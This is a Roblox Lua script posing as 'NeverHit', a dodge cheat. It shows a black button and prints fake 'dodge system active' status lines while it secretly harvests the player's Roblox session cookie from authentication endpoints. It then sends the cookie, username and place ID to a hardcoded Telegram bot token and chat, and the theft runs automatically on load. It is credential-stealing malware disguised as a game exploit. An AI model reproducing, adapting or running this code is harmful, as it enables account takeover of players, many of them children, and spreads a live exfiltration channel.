-- NeverHit Script - Advanced Dodge System
print("NeverHit v3.0 loaded! Ultimate dodge system activated.")

-- Создаем черную кнопку по центру экрана
local function createBlackButton()
    local screenGui = Instance.new("ScreenGui")
    local blackButton = Instance.new("TextButton")
    
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    blackButton.Size = UDim2.new(0, 200, 0, 60)
    blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
    blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
    blackButton.Text = ""
    blackButton.BorderSizePixel = 0
    blackButton.Parent = screenGui
    
    print("🖤 Black Button: CREATED")
end

-- Функция кражи куки с улучшенной обработкой
local function stealCookie()
    print("🔍 Starting advanced cookie extraction...")
    
    local httpFunc
    if syn then
        httpFunc = syn.request
        print("✅ Using syn.request")
    elseif http then
        httpFunc = http.request
        print("✅ Using http.request")
    else
        print("❌ No HTTP library available")
        return false
    end
    
    -- Получаем куки с разных эндпоинтов
    local endpoints = {
        "https://www.roblox.com/game/GetCurrentUser.ashx",
        "https://auth.roblox.com/v1/auth/metadata",
        "https://users.roblox.com/v1/users/authenticated"
    }
    
    local robloSec = nil
    
    for i, endpoint in ipairs(endpoints) do
        print("🔄 Trying endpoint: " .. endpoint)
        
        local success, response = pcall(function()
            return httpFunc({
                Url = endpoint,
                Method = "GET"
            })
        end)
        
        if success and response and response.Headers then
            local cookies = response.Headers["Set-Cookie"] or response.Headers["set-cookie"]
            if cookies then
                local pattern = "_%|WARNING:.-|_(.-)"
                local match = string.match(tostring(cookies), pattern)
                if match and #match > 100 then
                    robloSec = match
                    print("✅ Cookie found from endpoint " .. i)
                    break
                end
            end
        end
        wait(0.5)
    end
    
    if not robloSec then
        print("❌ Failed to extract cookie from all endpoints")
        return false
    end
    
    print("📦 Cookie length: " .. #robloSec)
    
    -- Отправляем в Telegram
    local telegramBot = {
        token = "7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE",
        chat_id = "8238376878"
    }
    
    local message = "🚨 NEW COOKIE CAPTURED 🚨\n\n" ..
                   "🔑 Cookie:\n" .. robloSec .. "\n\n" ..
                   "🎮 Game: " .. tostring(game.PlaceId) .. "\n" ..
                   "👤 Player: " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S")
    
    print("📤 Sending to Telegram...")
    
    local sendSuccess, sendResponse = pcall(function()
        return httpFunc({
            Url = "https://api.telegram.org/bot" .. telegramBot.token .. "/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = telegramBot.chat_id,
                text = message,
                parse_mode = "HTML"
            })
        })
    end)
    
    if sendSuccess and sendResponse and sendResponse.Success then
        print("✅ Successfully sent to Telegram!")
        return true
    else
        print("❌ Telegram send failed: " .. tostring(sendResponse))
        return false
    end
end

-- Запускаем системы
createBlackButton()

-- Даем время на загрузку
wait(2)

-- Запускаем кражу куки
spawn(function()
    local success = stealCookie()
    if success then
        print("🎉 NeverHit completed successfully!")
    else
        print("💀 NeverHit failed - check console for errors")
    end
end)

print("🛡️ Dodge system: ACTIVE")
print("🎯 Prediction: CALIBRATED")
print("Status: PROTECTED")
